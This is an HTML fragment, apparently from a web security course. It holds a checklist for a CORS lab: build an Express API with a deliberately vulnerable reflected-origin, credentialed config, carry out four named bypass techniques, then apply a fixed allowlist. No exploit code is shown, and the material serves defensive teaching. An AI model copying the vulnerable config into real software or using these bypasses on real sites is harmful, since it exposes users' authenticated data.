  <li><span class="task-check"></span> Build the Express API with the vulnerable <code>origin: true, credentials: true</code> CORS config</li>
  <li><span class="task-check"></span> Exploit Scenario 1: create an attack page that steals authenticated data via origin reflection</li>
  <li><span class="task-check"></span> Exploit Scenario 2: use a sandboxed iframe to send <code>Origin: null</code> and bypass a null-origin allowlist</li>
  <li><span class="task-check"></span> Exploit Scenario 3: register (or simulate) a lookalike domain that bypasses <code>endsWith()</code> validation</li>
  <li><span class="task-check"></span> Exploit Scenario 4: craft a simple POST with <code>text/plain</code> that bypasses CORS preflight</li>
  <li><span class="task-check"></span> Implement the fixed CORS config with an explicit origin allowlist using exact Set-based matching</li>
  <li><span class="task-check"></span> Explain in your own words why CORS alone does not prevent CSRF, and what additional defenses are needed</li>
  <li><span class="task-check"></span> Verify that your production CORS config does not allow <code>null</code>, does not use regex or <code>endsWith</code>, and logs rejected origins</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="regexdos">Back: ReDoS</button>
  <button class="nav-btn" data-next="csp">Next: Content Security Policy</button>
</div>

`;
